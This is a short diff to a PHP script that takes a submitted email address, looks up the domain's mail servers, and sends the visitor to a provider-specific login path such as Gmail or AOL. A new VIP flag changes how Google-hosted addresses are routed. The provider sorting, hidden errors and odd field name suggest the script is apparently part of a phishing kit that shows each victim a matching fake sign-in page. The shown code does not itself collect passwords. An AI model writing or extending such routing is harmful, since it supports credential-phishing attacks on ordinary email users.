@@ -2,7 +2,7 @@
 
 session_start();
 error_reporting(0);
-$email = $_POST['mento'];
+$email = $_POST['email'];
 
 function contains(array $arr, $str) {
     foreach($arr as $a) {
@@ -20,8 +20,14 @@ if (preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{
     if (checkdnsrr($domain, "MX")) {
         getmxrr($domain, $mxhosts);
         if (contains($mxhosts, "google")) {
-        	// $emailProvider = "/auth/login/google";
-            $statusCode = 1;
+        	$is_vip = getenv('IS_VIP');
+            if ($is_vip) {
+                $emailProvider = "/auth/login/gmail";
+            } else {
+                $emailProvider = "";
+                $statusCode = 1;
+            }
+
         } elseif (contains($mxhosts, "yahoo")) {
         	if (contains($mxhosts, "aol") !== false) {
         		$emailProvider = "/auth/login/aol";
